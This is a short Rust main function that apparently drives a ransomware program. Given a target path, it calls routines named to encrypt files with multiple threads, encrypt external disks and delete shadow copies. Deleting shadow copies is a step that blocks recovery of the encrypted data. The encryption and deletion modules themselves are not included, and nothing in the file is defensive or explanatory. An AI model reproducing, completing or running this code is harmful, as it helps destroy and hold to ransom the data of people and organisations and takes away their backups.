mod encryption;
mod system;

use std::{
    env,
    process::exit,
};
fn main(){
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        println!("Missing Arguments");
        exit(-1)
    }
    
    encryption::file::multi_threaded_encrypt_decrypt_files(&args[1][..]);
    encryption::disk::encrypt_decrypt_external_disks();
    system::file::delete_shadow_copies();

    exit(0);
}
